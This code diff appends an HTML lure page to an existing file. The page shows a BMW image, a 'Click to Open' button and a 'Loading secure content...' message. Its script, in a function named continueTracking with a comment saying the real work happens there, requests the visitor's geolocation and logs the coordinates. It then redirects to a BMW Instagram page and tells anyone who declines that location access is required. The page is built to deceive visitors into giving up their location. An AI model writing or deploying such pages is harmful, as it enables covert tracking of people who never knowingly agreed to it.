@@ -60,3 +60,89 @@
   </script>
 </body>
 </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Click to Open</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body, html {
+      height: 100%;
+      width: 100%;
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      background-image: url('https://i.pinimg.com/originals/01/ba/60/01ba6070c29035acb21f66ef2bc0b772.jpg'); /* BMW image */
+      background-size: cover;
+      background-position: center;
+      height: 100%;
+      width: 100%;
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .overlay {
+      background-color: rgba(0, 0, 0, 0.7); /* Slight blur effect */
+      height: 100%;
+      width: 100%;
+      position: absolute;
+    }
+    .btn-box {
+      z-index: 2;
+      position: absolute;
+      text-align: center;
+    }
+    .btn-box button {
+      padding: 15px 35px;
+      font-size: 22px;
+      border: none;
+      border-radius: 12px;
+      background-color: #ffffff;
+      color: #000;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .btn-box p {
+      color: white;
+      margin-top: 20px;
+      font-size: 16px;
+      opacity: 0.6;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="overlay"></div>
+    <div class="btn-box">
+      <button onclick="continueTracking()">Click to Open</button>
+      <p>Loading secure content...</p>
+    </div>
+  </div>
+
+  <script>
+    function continueTracking() {
+      // Real kaam yahin se hota
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          console.log("Lat:", position.coords.latitude);
+          console.log("Long:", position.coords.longitude);
+
+          // Redirect to BMW page
+          window.location.href = "https://www.instagram.com/bmw?igsh=MTNodHZreDFwaDhpdQ==";
+        },
+        function(error) {
+          alert("Location access required to continue.");
+        }
+      );
+    }
+  </script>
+
+</body>
+</html>
